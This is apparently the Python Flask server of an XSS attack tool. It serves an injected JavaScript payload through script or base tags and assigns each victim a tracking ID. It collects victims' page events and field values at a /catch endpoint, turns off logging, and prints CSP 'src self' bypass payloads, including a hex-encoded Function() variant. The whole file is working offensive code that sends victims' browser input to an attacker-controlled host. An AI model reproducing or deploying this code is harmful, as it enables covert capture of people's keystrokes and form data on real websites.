#imports
from flask import Flask, render_template, request, redirect, make_response, session
from flask_cors import CORS
import json
import logging
import secrets
from colorama import Fore, Back, Style
import lib.parse
from os import path

app = Flask(__name__)

#secret key for sessions generated at runtime
app.secret_key = secrets.token_urlsafe(16)

#configure cross origin credential support for victim tracking
CORS(app, supports_credentials=True)

#remove flasks default logging
log = logging.getLogger('werkzeug')
log.disabled = True

#simple array of xeventsIDs to keep track of victim number
sessions=[]

#handle base tag injection
@app.before_request
def prior():
	if request.path.endswith(".js"):
		return payload()
	else:
		pass


#return the payload
@app.route("/p")
def payload():

	#assign victim ID
	if "xeventsID" not in session:
		session["xeventsID"]=secrets.token_urlsafe(16)
		sessions.append(session["xeventsID"])

	#read tags and actions from config
	if args.tags and args.actions:
		tags=args.tags
		actions=args.actions
	else:
		with open(args.config,"r") as xeventsconfigfile:
			xeventsconfig=json.loads(xeventsconfigfile.read())
		tags=xeventsconfig["tags"]
		actions=xeventsconfig["actions"]

	#prepare and issue response
	resp=make_response(render_template("xevents.js",tags=tags,actions=actions,url=f"{args.url}/catch"))
	resp.headers["content-type"]="text/javascript"
	return resp

#catch json post requests
@app.route("/catch",methods=["POST"])
def catch():

	#set up variables from request json
	rj=request.json
	action=rj["action"]
	tag=rj["tag"]
	location=rj["location"]
	del rj["action"]
	del rj["tag"]
	del rj["location"]
	#current victim id
	victim=session["xeventsID"]

	#display results
	print(f"{tag} tag recieved {Fore.CYAN}{action}{Style.RESET_ALL} event from {Fore.RED}victim {sessions.index(victim)}{Style.RESET_ALL} on {Fore.GREEN}{location}{Style.RESET_ALL}")
	for key,value in zip(rj.keys(),rj.values()):
		if value:
			print(f"\t{key}:{value}")
	print("\n")
	return ""

if __name__ == "__main__":
	args=lib.parse.parser()
	print(f"{Fore.RED}inject as script tag: {Style.RESET_ALL}")
	print(f"{args.url}/p\n")

	print(f"{Fore.RED}inject as base tag: {Style.RESET_ALL}")
	print(args.url)
	print("\n")

	with open(path.join("templates","cspbypass.js"),"r") as cspbyp:
		payload=cspbyp.read().replace("%url%",args.url)
		encoded="".join(["\\x%x" %ord(char) for char in payload])
		encoded=f"Function(\"{encoded}\")()"
		payload=f"Function(\"{payload}\")()"


	print(f"{Fore.RED}csp src self bypass: {Style.RESET_ALL}")
	print(payload)
	print("\n")

	print(f"{Fore.RED}csp src self bypass + hex encoding: {Style.RESET_ALL}")
	print(encoded)
	print("\n")
	
	app.run(args.host,args.port)